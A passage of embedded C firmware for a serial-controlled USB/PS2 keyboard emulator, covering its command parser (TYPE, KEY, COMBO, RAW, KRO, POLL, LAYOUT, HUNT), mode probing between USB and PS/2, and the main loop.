  OUTP(" wakeups=");
  outU32(dbg_wakeups);
  outEol();
}

static void print_status(void) {
  OUTP("# uptime=");
  outU32(millis() / 1000UL);
  OUTP("s lines=");
  outU32(g_statLines);
  OUTP(" errors=");
  outU32(g_statErrors);
  OUTP(" typed=");
  outU32(g_statTyped);
  OUTP(" skipped=");
  outU32(g_statSkipped);
  outEol();
  OUTP("# rxdrop=");
  outU32(g_rxDropped);
  OUTP(" longline=");
  outU32(g_statOverflow);
  OUTP(" aborts=");
  outU32(g_statAborts);
  OUTP(" heldmods=0x");
  outHex8(g_heldMods);
  OUTP(" heldkeys=");
  outU32(g_heldKeys);
  outEol();
}

static void print_help(void) {
  OUTP("# TYPE <text> | LINE <text> | KEY <key> [n] | COMBO <a+b+key> [n]"); outEol();
  OUTP("# DOWN <key> | UP <key> | REL | DELAY <ms> | RAW <mod> <code>"); outEol();
  OUTP("# SET PRESS|GAP|SETTLE|DEAD|JITTER <ms> | SET ECHO|GUARD|CAPSFIX ON|OFF"); outEol();
  OUTP("# PING | INFO | STATUS | USB | HELP | RESET | REBOOT | FACTORY_RESET"); outEol();
  OUTP("# SPEED FULL|LOW|DEFAULT  set usb speed (saved in eeprom, used on reboot), re-enumerate | REENUM"); outEol();
  OUTP("# KRO BOOT|NKRO|ARRAY|MULTI|HYBRID|HYBRID2|CONSUMER|LSMULTI|LSCONSUMER  set report format (saved)"); outEol();
  OUTP("# LAYOUT [ES|US|DEFAULT]  character layout used by TYPE and LINE (saved in eeprom)"); outEol();
  OUTP("# CONSUMER <VOLUP|VOLDN|MUTE|PLAY|NEXT|PREV|STOP>  send a media key (consumer format)"); outEol();
  OUTP("# POLL <1..64 ms>|DEFAULT  set interrupt bInterval (1ms=1000Hz), saved in eeprom, re-enumerate"); outEol();
  OUTP("# HUNT ON|OFF     cycle attach/detach/speed/resume until a host reacts"); outEol();
  OUTP("# PS2 [ON|OFF|AUTO|BAT|ENABLE|PROBE|PULLUP ON|OFF|RAW <hex>]  ps2 kbd D7=clk A7=dat"); outEol();
}

static void reply_typed(uint16_t skipped, uint8_t aborted) {
  if (aborted) { g_statAborts++; OUTP("OK ABORT "); outU32(skipped); outEol(); return; }
  if (skipped) { OUTP("OK SKIP "); outU32(skipped); outEol(); return; }
  outOk();
}

static void cmd_set(const char *line, uint16_t len, uint16_t argStart) {
  char a[16], b[16];
  uint16_t pos = argStart;
  uint16_t na = next_token(line, len, &pos, a, sizeof(a));
  uint16_t nb = next_token(line, len, &pos, b, sizeof(b));
  if (na == 0) { ERRP("usage: SET PRESS|GAP|SETTLE|DEAD|JITTER|ECHO|GUARD|CAPSFIX <value>"); return; }
  to_upper(a);
  if (!strcmp(a, "PRESS") || !strcmp(a, "GAP") || !strcmp(a, "SETTLE") ||
      !strcmp(a, "DEAD") || !strcmp(a, "JITTER")) {
    uint32_t v;
    if (nb == 0 || !parse_u32(b, &v)) { ERRP("bad value"); return; }
    if (v > MAX_TIMING_MS) v = MAX_TIMING_MS;
    if (!strcmp(a, "PRESS")) g_cfg.pressMs = (uint16_t)v;
    else if (!strcmp(a, "GAP")) g_cfg.gapMs = (uint16_t)v;
    else if (!strcmp(a, "SETTLE")) g_cfg.settleMs = (uint16_t)v;
    else if (!strcmp(a, "DEAD")) g_cfg.deadMs = (uint16_t)v;
    else g_cfg.jitterMs = (uint16_t)v;
    settings_store();
    outOk();
    return;
  }
  if (!strcmp(a, "ECHO") || !strcmp(a, "GUARD") || !strcmp(a, "CAPSFIX")) {
    uint8_t v;
    if (nb == 0 || !parse_onoff(b, &v)) { ERRP("usage: ON|OFF"); return; }
    if (!strcmp(a, "ECHO")) g_cfg.echo = v;
    else if (!strcmp(a, "GUARD")) g_cfg.guard = v;
    else g_cfg.capsFix = v;
    settings_store();
    outOk();
    return;
  }
  ERRP("unknown SET parameter");
}

static void process_line(char *line, uint16_t len) {
  g_statLines++;
  g_abort = 0;

  uint16_t p = 0;
  while (p < len && (line[p] == ' ' || line[p] == '\t')) p++;
  uint16_t cmdStart = p;
  while (p < len && line[p] != ' ' && line[p] != '\t') p++;
  uint16_t cmdEnd = p;
  uint16_t argStart = (p < len) ? (uint16_t)(p + 1) : len;
  uint16_t cl = (uint16_t)(cmdEnd - cmdStart);
  if (cl == 0) { outOk(); return; }

  char cmd[16];
  if (cl >= sizeof(cmd)) cl = sizeof(cmd) - 1;
  for (uint16_t i = 0; i < cl; i++) {
    char c = line[cmdStart + i];
    cmd[i] = (c >= 'a' && c <= 'z') ? (char)(c - 32) : c;
  }
  cmd[cl] = '\0';

  const char *arg = line + argStart;
  uint16_t argLen = (uint16_t)(len - argStart);

  if (!strcmp(cmd, "PING")) { OUTP("PONG"); outEol(); return; }
  if (!strcmp(cmd, "HELP")) { print_help(); outOk(); return; }
  if (!strcmp(cmd, "INFO")) { print_info(); outOk(); return; }
  if (!strcmp(cmd, "STATUS")) { print_status(); outOk(); return; }
  if (!strcmp(cmd, "USB")) { print_usb(); outOk(); return; }

  if (!strcmp(cmd, "PS2")) {
    char tok[10];
    uint16_t pos = argStart;
    if (next_token(line, len, &pos, tok, sizeof(tok)) == 0) { print_ps2(); outOk(); return; }
    to_upper(tok);
    if (!strcmp(tok, "ON")) { g_modePin = PIN_PS2; mode_enter_ps2(); outOk(); return; }
    if (!strcmp(tok, "OFF")) { g_modePin = PIN_USB; mode_enter_usb(); outOk(); return; }
    if (!strcmp(tok, "AUTO")) {
      g_modePin = PIN_AUTO;
      g_mode = MODE_PROBE;
      g_probeDone = 0;
      g_probeStart = millis();
      outOk();
      return;
    }
    if (!strcmp(tok, "BAT")) { ps2_queue(PS2_BAT_OK); ps2_drain(300); outOk(); return; }
    if (!strcmp(tok, "ENABLE")) { ps2_enabled = 1; outOk(); return; }
    if (!strcmp(tok, "PROBE")) { g_ps2Pullups = ps2_host_pullups(); print_ps2(); outOk(); return; }
    if (!strcmp(tok, "PULLUP")) {
      char v[8];
      if (next_token(line, len, &pos, v, sizeof(v)) == 0) { print_ps2(); outOk(); return; }
      to_upper(v);
      if (!strcmp(v, "ON")) { ps2_set_pullups(1); print_ps2(); outOk(); return; }
      if (!strcmp(v, "OFF")) { ps2_set_pullups(0); print_ps2(); outOk(); return; }
      ERRP("usage: PS2 PULLUP ON|OFF");
      return;
    }
    if (!strcmp(tok, "RAW")) {
      char h[8];
      uint8_t b;
      if (next_token(line, len, &pos, h, sizeof(h)) == 0 || !parse_hex8(h, &b)) {
        ERRP("usage: PS2 RAW <hex>");
        return;
      }
      ps2_queue(b);
      ps2_drain(300);
      outOk();
      return;
    }
    ERRP("usage: PS2 [ON|OFF|AUTO|BAT|ENABLE|PROBE|PULLUP ON|OFF|RAW <hex>]");
    return;
  }

  if (!strcmp(cmd, "REL")) { release_everything(); busy(0); outOk(); return; }

  if (!strcmp(cmd, "RESET")) {
    release_everything();
    busy(0);
    set_defaults();
    settings_store();
    rx_clear();
    outOk();
    return;
  }

  if (!strcmp(cmd, "FACTORY_RESET")) {
    settings_erase();
    OUTP("# factory reset: eeprom cleared, rebooting into the compiled defaults");
    outEol();
    outOk();
    uart_flush();
    release_everything();
    usb_detach();
    wait_ms(100);
    cli();
    wdt_enable(WDTO_15MS);
    for (;;) { }
  }

  if (!strcmp(cmd, "REBOOT")) {
    outOk();
    uart_flush();
    release_everything();
    usb_detach();
    wait_ms(100);
    cli();
    wdt_enable(WDTO_15MS);
    for (;;) { }
  }

  if (!strcmp(cmd, "HUNT")) {
    char tok[8];
    uint16_t pos = argStart;
    uint8_t on = 1;
    if (next_token(line, len, &pos, tok, sizeof(tok)) != 0) {
      if (!parse_onoff(tok, &on)) { ERRP("usage: HUNT ON|OFF"); return; }
    }
    g_hunt = on;
    g_huntStep = 0;
    g_huntRound = 0;
    g_huntAt = millis();
    if (on) {
      dbg_resets = 0; dbg_setups = 0; dbg_getdesc = 0;
      dbg_setaddr = 0; dbg_setconfig = 0; dbg_stalls = 0;
      dbg_udint_seen = 0; dbg_suspends = 0; dbg_wakeups = 0;
    }
    outOk();
    return;
  }

  if (!strcmp(cmd, "SPEED")) {
    char tok[8];
    uint16_t pos = argStart;
    if (next_token(line, len, &pos, tok, sizeof(tok)) == 0) { ERRP("usage: SPEED FULL|LOW|DEFAULT"); return; }
    to_upper(tok);
    uint8_t want;
    if (!strcmp(tok, "LOW")) want = 1;
    else if (!strcmp(tok, "FULL")) want = 0;
    else if (!strcmp(tok, "DEFAULT")) want = USB_LOW_SPEED;
    else { ERRP("usage: SPEED FULL|LOW|DEFAULT"); return; }
    g_cfg.lowSpeed = want;
    settings_store();
    outOk();
    if (want && fmt_full_speed()) { OUTP("# note: current kro format requires full speed"); outEol(); }
    uart_flush();
    cli();
    usb_detach();
    sei();
    wait_ms(300);
    dbg_resets = 0; dbg_setups = 0; dbg_getdesc = 0;
    dbg_setaddr = 0; dbg_setconfig = 0; dbg_stalls = 0; dbg_sof = 0;
    dbg_last_req = 0xFF; dbg_last_reqtype = 0xFF; dbg_last_desc = 0xFF;
    g_reportsOk = 0; g_reportsFail = 0;
    cli();
    g_lowSpeed = fmt_full_speed() ? 0 : want;   /* wide reports need a full-speed endpoint */
    usb_init();
    sei();
    wait_ms(500);
    print_info();
    return;
  }

  if (!strcmp(cmd, "LAYOUT")) {
    char tok[12];
    uint16_t pos = argStart;
    if (next_token(line, len, &pos, tok, sizeof(tok)) == 0) {
      OUTP("# layout=");
      out_layout();
      outEol();
      outOk();
      return;
    }
    to_upper(tok);
    uint8_t want;
    if (!strcmp(tok, "ES") || !strcmp(tok, "DEFAULT")) want = LAYOUT_ES;
    else if (!strcmp(tok, "US")) want = LAYOUT_US;
    else { ERRP("usage: LAYOUT ES|US|DEFAULT"); return; }
    g_cfg.layout = want;
    settings_store();
    g_cfg.layout = want;
    OUTP("# layout=");
    out_layout();
    outEol();
    outOk();
    return;
  }

  if (!strcmp(cmd, "KRO")) {
    char tok[12];
    uint16_t pos = argStart;
    uint8_t want = 0xFF;
    if (next_token(line, len, &pos, tok, sizeof(tok)) != 0) {
      to_upper(tok);
      if (!strcmp(tok, "BOOT")) want = KRO_BOOT;
      else if (!strcmp(tok, "NKRO")) want = KRO_NKRO;
      else if (!strcmp(tok, "ARRAY")) want = KRO_ARRAY;
      else if (!strcmp(tok, "MULTI")) want = KRO_MULTI;
      else if (!strcmp(tok, "HYBRID")) want = KRO_HYBRID;
      else if (!strcmp(tok, "HYBRID2")) want = KRO_HYBRID2;
      else if (!strcmp(tok, "CONSUMER")) want = KRO_CONSUMER;
      else if (!strcmp(tok, "LSMULTI")) want = KRO_LSMULTI;
      else if (!strcmp(tok, "LSCONSUMER")) want = KRO_LSCONS;
    }
    if (want == 0xFF) { ERRP("usage: KRO BOOT|NKRO|ARRAY|MULTI|HYBRID|HYBRID2|CONSUMER|LSMULTI|LSCONSUMER"); return; }
    g_cfg.kro = want;
    settings_store();
    outOk();
    uart_flush();
    release_everything();
    cli();
    usb_detach();
    sei();
    wait_ms(300);
    dbg_resets = 0; dbg_setups = 0; dbg_getdesc = 0;
    dbg_setaddr = 0; dbg_setconfig = 0; dbg_stalls = 0; dbg_sof = 0;
    dbg_last_req = 0xFF; dbg_last_reqtype = 0xFF; dbg_last_desc = 0xFF;
    g_reportsOk = 0; g_reportsFail = 0;
    cli();
    g_cfg.kro = want;
    g_lowSpeed = fmt_full_speed() ? 0 : g_cfg.lowSpeed;   /* wide reports need full speed */
    usb_init();
    sei();
    wait_ms(500);
    print_info();
    return;
  }

  if (!strcmp(cmd, "POLL")) {
    char tok[10];
    uint16_t pos = argStart;
    if (next_token(line, len, &pos, tok, sizeof(tok)) == 0) { ERRP("usage: POLL <1..64 ms>|DEFAULT"); return; }
    to_upper(tok);
    uint8_t val;
    if (!strcmp(tok, "DEFAULT")) val = DEF_POLL;
    else {
      uint32_t v;
      if (!parse_u32(tok, &v) || v < 1 || v > 64) { ERRP("usage: POLL <1..64 ms>|DEFAULT"); return; }
      val = (uint8_t)v;
    }
    g_cfg.poll = val;
    settings_store();
    outOk();
    uart_flush();
    cli();
    usb_detach();
    sei();
    wait_ms(300);
    dbg_resets = 0; dbg_setups = 0; dbg_getdesc = 0; dbg_setaddr = 0; dbg_setconfig = 0; dbg_stalls = 0; dbg_sof = 0;
    dbg_last_req = 0xFF; dbg_last_reqtype = 0xFF; dbg_last_desc = 0xFF;
    g_reportsOk = 0; g_reportsFail = 0;
    cli();
    g_cfg.poll = val;
    usb_init();
    sei();
    wait_ms(500);
    print_info();
    return;
  }

  if (!strcmp(cmd, "CONSUMER")) {
    if (g_cfg.kro != KRO_CONSUMER && g_cfg.kro != KRO_LSCONS) { ERRP("set KRO CONSUMER or LSCONSUMER first"); return; }
    if (g_mode != MODE_USB || !usb_configuration || hid_protocol == 0) { ERRP("consumer needs usb report protocol"); return; }
    char tok[12];
    uint16_t pos = argStart;
    if (next_token(line, len, &pos, tok, sizeof(tok)) == 0) { ERRP("usage: CONSUMER VOLUP|VOLDN|MUTE|PLAY|NEXT|PREV|STOP"); return; }
    to_upper(tok);
    uint16_t u = 0;
    if (!strcmp(tok, "VOLUP")) u = 0x00E9;
    else if (!strcmp(tok, "VOLDN")) u = 0x00EA;
    else if (!strcmp(tok, "MUTE")) u = 0x00E2;
    else if (!strcmp(tok, "PLAY")) u = 0x00CD;
    else if (!strcmp(tok, "NEXT")) u = 0x00B5;
    else if (!strcmp(tok, "PREV")) u = 0x00B6;
    else if (!strcmp(tok, "STOP")) u = 0x00B7;
    else { ERRP("unknown media key"); return; }
    busy(1);
    consumer_send(u);
    wait_ms(g_cfg.pressMs);
    consumer_send(0);
    wait_ms(g_cfg.gapMs);
    busy(0);
    outOk();
    return;
  }

  if (!strcmp(cmd, "REENUM")) {
    outOk();
    uart_flush();
    cli();
    usb_detach();
    sei();
    wait_ms(300);
    dbg_resets = 0; dbg_setups = 0; dbg_getdesc = 0;
    dbg_setaddr = 0; dbg_setconfig = 0; dbg_stalls = 0; dbg_sof = 0;
    cli();
    usb_init();
    sei();
    wait_ms(500);
    print_usb();
    return;
  }

  if (!strcmp(cmd, "SET")) { cmd_set(line, len, argStart); return; }

  if (!strcmp(cmd, "DELAY")) {
    char tok[12];
    uint16_t pos = argStart;
    uint32_t v;
    if (next_token(line, len, &pos, tok, sizeof(tok)) == 0 || !parse_u32(tok, &v)) { ERRP("bad ms"); return; }
    if (v > MAX_DELAY_MS) v = MAX_DELAY_MS;
    uint32_t start = millis();
    while ((uint32_t)(millis() - start) < v) {
      if (g_abort) { g_statAborts++; OUTP("OK ABORT 0"); outEol(); return; }
      wait_ms(5);
    }
    outOk();
    return;
  }

  if (!strcmp(cmd, "TYPE") || !strcmp(cmd, "LINE")) {
    uint8_t withEnter = (uint8_t)(cmd[0] == 'L');
    if (!link_wait_ready()) { ERRP("link not ready"); return; }
    uint8_t aborted = 0;
    uint16_t sk = type_string(arg, argLen, &aborted);
    if (withEnter && !aborted) { busy(1); if (!tap(MOD_NONE, K_ENTER)) sk++; busy(0); }
    reply_typed(sk, aborted);
    return;
  }

  if (!strcmp(cmd, "KEY")) {
    char tok[24], cnt[8];
    uint16_t pos = argStart;
    if (next_token(line, len, &pos, tok, sizeof(tok)) == 0) { ERRP("missing key"); return; }
    uint32_t repeat = 1;
    if (next_token(line, len, &pos, cnt, sizeof(cnt)) != 0) {
      if (!parse_u32(cnt, &repeat) || repeat == 0) { ERRP("bad count"); return; }
      if (repeat > MAX_REPEAT) repeat = MAX_REPEAT;
    }
    if (!link_wait_ready()) { ERRP("link not ready"); return; }
    char up[24];
    strcpy(up, tok);
    to_upper(up);
    uint8_t hid = lookup_named(up);
    uint16_t sk = 0;
    uint8_t aborted = 0;
    busy(1);
    hid_warmup();
    for (uint32_t r = 0; r < repeat; r++) {
      if (g_abort) { aborted = 1; break; }
      if (hid) { if (!tap(MOD_NONE, hid)) sk++; }
      else {
        busy(0);
        uint8_t ab = 0;
        sk = (uint16_t)(sk + type_string(tok, (uint16_t)strlen(tok), &ab));
        busy(1);
        if (ab) { aborted = 1; break; }
      }
    }
    busy(0);
    reply_typed(sk, aborted);
    return;
  }

  if (!strcmp(cmd, "COMBO")) {
    char tok[48], cnt[8];
    uint16_t pos = argStart;
    if (next_token(line, len, &pos, tok, sizeof(tok)) == 0) { ERRP("missing combo"); return; }
    uint32_t repeat = 1;
    if (next_token(line, len, &pos, cnt, sizeof(cnt)) != 0) {
      if (!parse_u32(cnt, &repeat) || repeat == 0) { ERRP("bad count"); return; }
      if (repeat > MAX_REPEAT) repeat = MAX_REPEAT;
    }
    uint8_t mods, hid;
    if (!parse_combo(tok, &mods, &hid)) { ERRP("invalid combo"); return; }
    if (!link_wait_ready()) { ERRP("link not ready"); return; }
    uint16_t sk = 0;
    uint8_t aborted = 0;
    busy(1);
    hid_warmup();
    for (uint32_t r = 0; r < repeat; r++) {
      if (g_abort) { aborted = 1; break; }
      if (!tap(mods, hid)) sk++;
    }
    busy(0);
    reply_typed(sk, aborted);
    return;
  }

  if (!strcmp(cmd, "DOWN") || !strcmp(cmd, "UP")) {
    char tok[24];
    uint16_t pos = argStart;
    if (next_token(line, len, &pos, tok, sizeof(tok)) == 0) { ERRP("missing key"); return; }
    uint8_t down = (uint8_t)(cmd[0] == 'D');
    if (down && !link_wait_ready()) { ERRP("link not ready"); return; }
    if (hold_key(tok, down)) outOk();
    else ERRP("invalid key");
    return;
  }

  if (!strcmp(cmd, "RAW")) {
    char a[8], b[8];
    uint16_t pos = argStart;
    uint16_t na = next_token(line, len, &pos, a, sizeof(a));
    uint16_t nb = next_token(line, len, &pos, b, sizeof(b));
    uint8_t mod, key;
    if (na == 0 || nb == 0 || !parse_hex8(a, &mod) || !parse_hex8(b, &key)) {
      ERRP("usage: RAW <mod_hex> <code_hex>");
      return;
    }
    if (!link_wait_ready()) { ERRP("link not ready"); return; }
    busy(1);
    hid_warmup();
    uint8_t ok = tap(mod, key);
    busy(0);
    if (ok) outOk();
    else ERRP("hid report rejected");
    return;
  }

  g_statErrors++;
  OUTP("ERR unknown command: ");
  outStr(cmd);
  outEol();
}

static void banner_service(void) {
  if (g_rxSeen || g_bannerLeft == 0) return;
  if ((uint32_t)(millis() - g_bannerAt) < BANNER_PERIOD_MS) return;
  g_bannerAt = millis();
  g_bannerLeft--;
  OUTP("READY");
  outEol();
}

static void mode_enter_usb(void) {
  if (g_mode == MODE_USB) return;
  ps2_tx_clear();
  ps2_arg = PS2_ARG_NONE;
  ps2_lines_idle();
  memset(ps2_prev, 0, sizeof(ps2_prev));
  memset(kb_report, 0, sizeof(kb_report));
  g_heldMods = 0;
  g_heldKeys = 0;
  hid_leds = 0;
  g_mode = MODE_USB;
  OUTP("# mode=usb speed=");
  if (g_lowSpeed) OUTP("low"); else OUTP("full");
  outEol();
}

static void mode_enter_ps2(void) {
  if (g_mode == MODE_PS2) return;
  memset(kb_report, 0, sizeof(kb_report));
  memset(ps2_prev, 0, sizeof(ps2_prev));
  g_heldMods = 0;
  g_heldKeys = 0;
  ps2_pins_init();
  ps2_tx_clear();
  ps2_arg = PS2_ARG_NONE;
  ps2_enabled = 1;
  ps2_leds = 0;
  hid_leds = 0;
  g_mode = MODE_PS2;
  ps2_queue(PS2_BAT_OK);
  OUTP("# mode=ps2 clk=D7 dat=A7 pullups=");
  outU32(g_ps2Pullups);
  outEol();
}

static uint8_t usb_host_seen(void) {
  return (uint8_t)((dbg_setups > 0) || (dbg_resets >= 2));
}

static void mode_service(void) {
  if (g_hunt) return;
  if (g_modePin == PIN_USB) { mode_enter_usb(); return; }
  if (g_modePin == PIN_PS2) { mode_enter_ps2(); return; }

  uint8_t vbus = (uint8_t)((USBSTA & (1 << VBUS)) ? 1 : 0);

  if (g_mode == MODE_PROBE) {
    if (usb_host_seen()) { mode_enter_usb(); return; }
    uint32_t age = (uint32_t)(millis() - g_probeStart);
    if (!g_probeDone && age >= PROBE_LINE_AT_MS) {
      g_probeDone = 1;
      g_ps2Pullups = ps2_host_pullups();
    }
    uint32_t need = vbus ? (g_ps2Pullups ? PROBE_PULLUP_MS : PROBE_VBUS_MS) : PROBE_NOVBUS_MS;
    if (age >= need) mode_enter_ps2();
    return;
  }

  if (g_mode == MODE_PS2) {
    if (usb_host_seen()) mode_enter_usb();
    return;
  }

  if (vbus) { g_usbLostAt = 0; return; }
  if (g_usbLostAt == 0) { g_usbLostAt = millis(); return; }
  if ((uint32_t)(millis() - g_usbLostAt) < USB_LOST_MS) return;
  g_usbLostAt = 0;
  dbg_resets = 0;
  dbg_setups = 0;
  usb_configuration = 0;
  g_probeDone = 0;
  g_probeStart = millis();
  g_mode = MODE_PROBE;
  OUTP("# usb power lost, probing again");
  outEol();
}

static void hunt_service(void) {
  if (!g_hunt) return;
  if (g_mode == MODE_PS2) { g_hunt = 0; return; }

  if (dbg_resets > 0 || dbg_setups > 0) {
    g_hunt = 0;
    OUTP("# HUNT: host reacted at step ");
    outU32(g_huntStep);
    OUTP(" round ");
    outU32(g_huntRound);
    outEol();
    print_usb();
    return;
  }

  if ((uint32_t)(millis() - g_huntAt) < 1200) return;
  g_huntAt = millis();

  switch (g_huntStep) {
    case 0:
      cli(); usb_detach(); sei();
      break;
    case 1:
      cli(); g_lowSpeed = 0; usb_init(); sei();
      break;
    case 2:
      cli(); usb_detach(); sei();
      break;
    case 3:
      cli(); g_lowSpeed = fmt_full_speed() ? 0 : 1; usb_init(); sei();
      break;
    case 4:
      UDCON |= (1 << RMWKUP);
      _delay_ms(10);
      UDCON &= (uint8_t)~(1 << RMWKUP);
      break;
    case 5:
      cli(); usb_detach(); sei();
      _delay_ms(50);
      cli(); usb_init(); sei();
      break;
    default:
      g_huntStep = 0;
      g_huntRound++;
      OUTP("# HUNT: round ");
      outU32(g_huntRound);
      OUTP(" done, no reaction (speed=");
      if (g_lowSpeed) OUTP("low"); else OUTP("full");
      OUTP(")");
      outEol();
      return;
  }
  g_huntStep++;
}

static void abort_service(void) {
  if (!g_abort) return;
  g_abort = 0;
  g_statAborts++;
  release_everything();
  busy(0);
  rx_clear();
  OUTP("# abort, queue flushed");
  outEol();
}

int main(void) {
  MCUSR = 0;
  wdt_disable();

  led_set(0);
  LED_DDR |= (1 << LED_BIT);
  BUSY_DDR |= (1 << BUSY_BIT);
  BUSY_PORT &= (uint8_t)~(1 << BUSY_BIT);

  CLKPR = 0x80;
  CLKPR = 0x00;

  settings_load();
  g_lowSpeed = g_cfg.lowSpeed;
  if (fmt_full_speed()) g_lowSpeed = 0;   /* wide reports need a full-speed endpoint */

  ps2_pins_init();
  usb_init();
  sei();

  timer_init();
  uart_init(UART_BAUD);

  wdt_enable(WDTO_4S);

  g_probeStart = millis();

  print_info();
  OUTP("# probing: usb traffic wins, otherwise ps2 keyboard on D7=clk A7=dat");
  outEol();
  OUTP("READY");
  outEol();
  g_bannerAt = millis();

  uint8_t vbus_prev = (USBSTA & (1 << VBUS)) ? 1 : 0;

  for (;;) {
    wdt_reset();
    {
      uint8_t v = (USBSTA & (1 << VBUS)) ? 1 : 0;
      if (v != vbus_prev) {
        vbus_prev = v;
        dbg_vbus_changes++;
        dbg_vbus_last_ms = millis();
      }
    }
    if (g_rxActivity) {
      g_rxActivity = 0;
      g_rxSeen = 1;
      g_rxFlashUntil = millis() + RX_FLASH_MS;
    }
    led_service();
    mode_service();
    ps2_pump();
    abort_service();
    hunt_service();
    hold_service();
    banner_service();

    int c;
    while ((c = rx_pop()) >= 0) {
      if (!g_rxSeen) { g_rxSeen = 1; g_rxFlashUntil = millis() + RX_FLASH_MS; }

      if (c == 0) continue;

      if (c == '\r' || c == '\n') {
        if ((c == '\n' && g_lastEol == '\r') ||
            (c == '\r' && g_lastEol == '\n')) {
          g_lastEol = 0;
          continue;
        }
        g_lastEol = (char)c;
        if (g_cfg.echo) outEol();
        if (g_lineOverflow) {
          g_statOverflow++;
          g_lineOverflow = 0;
          g_lineLen = 0;
          ERRP("line too long");
          continue;
        }
        g_line[g_lineLen] = '\0';
        uint16_t len = g_lineLen;
        g_lineLen = 0;
        g_rxFlashUntil = millis() + RX_FLASH_MS;
        process_line(g_line, len);
        wdt_reset();
        if (g_abort) { abort_service(); break; }
        continue;
      }

      g_lastEol = 0;

      if (g_cfg.echo && (c == 0x08 || c == 0x7F)) {
        if (g_lineLen > 0) { g_lineLen--; OUTP("\b \b"); }
        continue;
      }

      if (g_cfg.echo) uart_putc((char)c);

      if (g_lineLen < LINE_MAX) g_line[g_lineLen++] = (char)c;
      else g_lineOverflow = 1;
    }
  }
}
